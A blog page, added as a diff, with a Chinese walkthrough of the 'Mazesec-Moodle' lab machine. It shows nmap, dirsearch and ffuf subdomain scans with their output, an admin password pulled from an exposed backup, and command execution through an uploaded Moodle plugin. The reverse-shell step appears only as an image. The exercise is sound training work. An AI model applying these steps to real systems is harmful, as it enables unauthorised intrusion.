@@ -1,0 +1,777 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机来源：QQ群-660930334 难度：Eeasy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mazesec-Moodle">
+<meta property="og:url" content="http://miao-sec.github.io/Maze-sec/Mazesec-Moodle/index.html">
+<meta property="og:site_name" content="Miao Blog">
+<meta property="og:description" content="靶机来源：QQ群-660930334 难度：Eeasy">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131528641.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131525607.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131533719.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131546958.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131545190.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131545273.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131549258.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131550702.png">
+<meta property="article:published_time" content="2026-01-13T14:55:14.000Z">
+<meta property="article:modified_time" content="2026-03-10T14:58:49.542Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="子域名burf">
+<meta property="article:tag" content="Moodle">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131528641.png">
+  
+  
+  
+  <title>Mazesec-Moodle - Miao Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":"flase"},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Mazesec-Moodle"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-13 22:55" pubdate>
+          2026年1月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Mazesec-Moodle</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>靶机来源：QQ群-<code>660930334</code></p>
+<p>难度：Eeasy</p>
+<span id="more"></span>
+
+<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-12 10:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00083s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00057s latency).<br>MAC Address: 08:00:27:C0:99:AA (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> hacker.maze-sec.hmv (192.168.2.40)<br>Host is up (0.00092s latency).<br>MAC Address: 08:00:27:D9:43:14 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.19 seconds<br></code></pre></td></tr></table></figure>
+
+<p>靶机IP：<code>192.168.2.40</code></p>
+<h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.40<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-12 10:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> hacker.maze-sec.hmv (192.168.2.40)<br>Host is up (0.00051s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:D9:43:14 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.63 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放端口：<code>22、80</code></p>
+<h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.40<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-12 10:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> hacker.maze-sec.hmv (192.168.2.40)<br>Host is up (0.0014s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="hljs-string">MAC Address: 08:00:27:D9:43:14 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.40                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-12 10:51 CST<br>Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan<br>UDP Scan Timing: About 38.40% <span class="hljs-keyword">done</span>; ETC: 10:52 (0:00:51 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> hacker.maze-sec.hmv (192.168.2.40)<br>Host is up (0.0013s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:D9:43:14 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 104.55 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、域名发现"><a href="#1、域名发现" class="headerlink" title="1、域名发现"></a>1、域名发现</h2><p>查看80端口，发现隐藏的域名<code>moodle.dsz</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# curl http://192.168.2.40                           <br>&lt;!-- moodle.dsz --&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp/moodle]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://moodle.dsz&quot;</span> <br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /tmp/moodle/reports/http_moodle.dsz/_26-01-13_15-28-12.txt<br><br>Target: http://moodle.dsz/<br><br>[15:28:12] Starting: <br>[15:28:16] 403 -  275B  - /.ht_wsr.txt<br>[15:28:16] 403 -  275B  - /.htaccess.bak1<br>[15:28:16] 403 -  275B  - /.htaccess.orig<br>[15:28:16] 403 -  275B  - /.htaccess.sample<br>[15:28:16] 403 -  275B  - /.htaccess.save<br>[15:28:16] 403 -  275B  - /.htaccess_sc<br>[15:28:16] 403 -  275B  - /.htaccess_orig<br>[15:28:16] 403 -  275B  - /.htaccessBAK<br>[15:28:16] 403 -  275B  - /.htaccess_extra<br>[15:28:16] 403 -  275B  - /.htaccessOLD<br>[15:28:16] 403 -  275B  - /.htaccessOLD2<br>[15:28:16] 403 -  275B  - /.htm<br>[15:28:16] 403 -  275B  - /.html<br>[15:28:16] 403 -  275B  - /.htpasswd_test<br>[15:28:16] 403 -  275B  - /.htpasswds<br>[15:28:16] 403 -  275B  - /.httr-oauth<br>[15:28:18] 403 -  275B  - /.php<br>[15:28:27] 301 -  308B  - /admin  -&gt;  http://moodle.dsz/admin/<br>[15:28:29] 303 -    1KB - /admin/  -&gt;  http://moodle.dsz/admin/index.php?cache=1<br>[15:28:30] 303 -    1KB - /admin/index.php  -&gt;  http://moodle.dsz/admin/index.php?cache=1<br>[15:28:40] 301 -  307B  - /auth  -&gt;  http://moodle.dsz/auth/<br>[15:28:40] 200 -    0B  - /auth/<br>[15:28:41] 301 -  309B  - /backup  -&gt;  http://moodle.dsz/backup/<br>[15:28:42] 200 -  756B  - /backup/<br>[15:28:43] 301 -  309B  - /blocks  -&gt;  http://moodle.dsz/blocks/<br>[15:28:43] 301 -  307B  - /blog  -&gt;  http://moodle.dsz/blog/<br>[15:28:43] 303 -    1KB - /blog/  -&gt;  http://moodle.dsz/login/index.php<br>[15:28:44] 301 -  308B  - /cache  -&gt;  http://moodle.dsz/cache/<br>[15:28:44] 301 -  311B  - /calendar  -&gt;  http://moodle.dsz/calendar/<br>[15:28:44] 200 -  656B  - /cache/<br>[15:28:47] 301 -  310B  - /comment  -&gt;  http://moodle.dsz/comment/<br>[15:28:47] 200 -    0B  - /config.php<br>[15:28:55] 301 -  308B  - /error  -&gt;  http://moodle.dsz/error/<br>[15:28:55] 404 -  665B  - /error/<br>[15:28:57] 404 -   22KB - /file.php<br>[15:28:57] 301 -  308B  - /files  -&gt;  http://moodle.dsz/files/<br>[15:28:58] 303 -    1KB - /files/  -&gt;  http://moodle.dsz/login/index.php<br>[15:29:00] 301 -  308B  - /group  -&gt;  http://moodle.dsz/group/<br>[15:29:05] 301 -  310B  - /install  -&gt;  http://moodle.dsz/install/<br>[15:29:05] 302 -    0B  - /install.php  -&gt;  admin/index.php?lang=en<br>[15:29:05] 302 -    0B  - /install.php?profile=default  -&gt;  admin/index.php?lang=en<br>[15:29:05] 200 -  567B  - /install/<br>[15:29:08] 301 -  307B  - /lang  -&gt;  http://moodle.dsz/lang/<br>[15:29:08] 301 -  306B  - /lib  -&gt;  http://moodle.dsz/lib/<br>[15:29:08] 200 -    1B  - /lib/<br>[15:29:09] 301 -  308B  - /local  -&gt;  http://moodle.dsz/local/<br>[15:29:09] 200 -  470B  - /local/<br>[15:29:10] 301 -  308B  - /login  -&gt;  http://moodle.dsz/login/<br>[15:29:12] 200 -    5KB - /login/<br>[15:29:14] 301 -  308B  - /media  -&gt;  http://moodle.dsz/media/<br>[15:29:14] 200 -  486B  - /media/<br>[15:29:27] 301 -  306B  - /pix  -&gt;  http://moodle.dsz/pix/<br>[15:29:29] 301 -  310B  - /privacy  -&gt;  http://moodle.dsz/privacy/<br>[15:29:31] 404 -  665B  - /r.php<br>[15:29:32] 301 -  309B  - /report  -&gt;  http://moodle.dsz/report/<br>[15:29:33] 301 -  313B  - /repository  -&gt;  http://moodle.dsz/repository/<br>[15:29:34] 301 -  306B  - /rss  -&gt;  http://moodle.dsz/rss/<br>[15:29:35] 301 -  309B  - /search  -&gt;  http://moodle.dsz/search/<br>[15:29:36] 200 -  375B  - /security.txt<br>[15:29:36] 403 -  275B  - /server-status<br>[15:29:36] 403 -  275B  - /server-status/<br>[15:29:45] 301 -  306B  - /tag  -&gt;  http://moodle.dsz/tag/<br>[15:29:48] 301 -  308B  - /theme  -&gt;  http://moodle.dsz/theme/<br>[15:29:51] 301 -  307B  - /user  -&gt;  http://moodle.dsz/user/<br>[15:29:51] 404 -   22KB - /user/<br><br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>找到管理后台，需要账号和密码 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131528641.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<h2 id="3、子域名爆破"><a href="#3、子域名爆破" class="headerlink" title="3、子域名爆破"></a>3、子域名爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# ffuf -u http://moodle.dsz  -H <span class="hljs-string">&quot;Host: FUZZ.moodle.dsz&quot;</span>  -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  -fs 20  -ac<br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://moodle.dsz</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</span><br><span class="hljs-string"> :: Header           : Host: FUZZ.moodle.dsz</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : true</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string"> :: Filter           : Response size: 20</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">dev                     [Status: 200, Size: 2512, Words: 990, Lines: 96, Duration: 700ms]</span><br><span class="hljs-string">:: Progress: [100000/100000] :: Job [1/1] :: 4878 req/sec :: Duration: [0:00:16] :: Errors: 0 ::</span><br></code></pre></td></tr></table></figure>
+
+<p>找到子域名：<code>dev.moodle.dsz</code></p>
+<h2 id="4、dev子域名目录扫描"><a href="#4、dev子域名目录扫描" class="headerlink" title="4、dev子域名目录扫描"></a>4、dev子域名目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://dev.moodle.dsz&quot;</span>            <br>....<br>[15:18:16] 200 -   74MB - /backup.tar.gz<br>[15:18:25] 302 -    0B  - /dashboard.php  -&gt;  index.php<br>[15:18:46] 302 -    0B  - /logout.php  -&gt;  index.php<br>...<br></code></pre></td></tr></table></figure>
+
+<p>找到备份文件<code>/backup.tar.gz</code></p>
+<p>找到密码，<code>pzp5V2Of3akjaJrhRauR.</code> <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131525607.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p>使用凭证<code>admin:pzp5V2Of3akjaJrhRauR.</code>成功登录 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131533719.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<h1 id="三、获取shell"><a href="#三、获取shell" class="headerlink" title="三、获取shell"></a>三、获取shell</h1><p>在<code>Site administration</code>–<code>Plugins</code>–<code>Install plugins</code>中安装插件 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131546958.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p>安装成功</p>
+<p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131545190.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131545273.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"> 测试命令，成功获取到id <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131549258.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p>反弹shell <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601131550702.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
